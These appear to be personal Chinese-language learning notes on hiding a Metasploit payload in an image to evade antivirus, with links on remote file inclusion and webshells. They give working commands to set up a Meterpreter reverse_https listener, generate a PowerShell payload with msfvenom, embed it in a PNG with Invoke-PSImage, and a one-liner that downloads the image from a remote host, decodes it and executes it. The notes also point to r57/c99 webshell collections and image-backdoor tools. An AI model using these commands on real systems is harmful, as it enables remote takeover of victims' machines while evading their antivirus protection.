# 隐写

参考：
[渗透测试之地基免杀篇：隐写RGB过所有杀软](https://www.freebuf.com/articles/web/262978.html)
https://github.com/dayuxiyou/Invoke-PSImage
git clone git@gitee.com:azhao-1981/Invoke-PSImage.git
3、MSF生成后门
NOTE: 直接运行 msfconsole 的方法
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.56.111; set lport 5555; exploit -j; "

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.111 LPORT=5555 -f psh-reflection > msf-dayu.ps1

测试ps1
WINDOWS执行：
权限
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
执行
Import-Module .\Invoke-PSimage.ps1

Invoke-PSImage -Script .\msf-dayu.ps1 -Image .\hackers.jpg -Out .\cs-dayu.png -Web

Invoke-PSImage : 使用“1”个参数调用“ReadAllText”时发生异常:“对路径的访问被拒绝。”
可能是本机杀毒软件把他

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://example.com/cs-dayu.png"));$o=a Byte[] 3600;(0..5)|%{foreach($x in(0..599)){$p=$g.GetPixel($x,$_);$o[$_*600+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3210]))

TODO： 文件出来了，怎么执行，双击并不能执行

NOTE：
火绒可以检查出原ps1，并删除，需要添加信任
我的fc并不能检查出来，上传不会被删除


隐写工具篇
https://www.kancloud.cn/wintry/kali-linux/784110

RFI 远程文件包含
Hiding Webshell Backdoor Code in Image Files
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/hiding-webshell-backdoor-code-in-image-files/
https://cwatch.comodo.com/blog/cyber-attack/remote-file-inclusion-rfi/

这是一个恶意代码的集合，在哪里？
malicious RFI COde Samples
R57
c99
https://www.ma-no.org/en/security/how-to-detect-r57-and-c99-shells-in-your-server
Russian PHP script, r57shell

这里有：
https://github.com/backdoorhub/shell-backdoor-list
git clone git@gitee.com:azhao-1981/shell-backdoor-list.git
https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/r57.php
Delete c99.php 但不知道为什么要删除c99
好像还有一个专门的网站
https://r57.gen.tr/
http://www.r57c99.com/

这里是个相关知识的例子而以，没有代码
https://github.com/payloadbox/rfi-lfi-payload-list

一个考试
https://secf00tprint.github.io/blog/payload-tester/lfirfi/en

用于检查的工具
http://www.rfxn.com/projects/linux-malware-detect/
http://www.rfxn.com/downloads/maldetect-current.tar.gz

https://github.com/r00t-3xp10it/FakeImageExploiter
git@gitee.com:azhao-1981/FakeImageExploiter.git
图片后门捆绑利用工具 – FakeImageExploiter
https://blog.csdn.net/abc5578786/article/details/102447124
x [☆] FakeImageExploiter needs to restart to finish installs .. 这个东西装了很多东西，而且还需要 “安装”
+ 用 kali试一下